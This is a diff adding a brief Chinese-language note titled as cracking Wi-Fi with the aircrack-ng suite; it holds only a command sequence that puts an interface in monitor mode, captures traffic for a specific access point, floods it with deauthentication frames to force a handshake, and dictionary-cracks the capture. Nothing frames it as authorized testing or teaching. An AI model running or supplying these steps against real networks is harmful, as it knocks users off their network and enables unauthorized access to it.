@@ -1,0 +1,11 @@
+用aircrack-ng套件破解wifi
+
+airmon-ng start wlan0
+
+airodump-ng wlan0mon
+
+airodump-ng -w /tmp/test.cap -c 11 --bssid 40:16:97:76:E7:DE wlan0mon --ignore-negative-one
+
+aireplay-ng -0 0 -a 40:16:97:76:E7:DE wlan0mon
+
+aircrack-ng -w passDic.txt test.cap
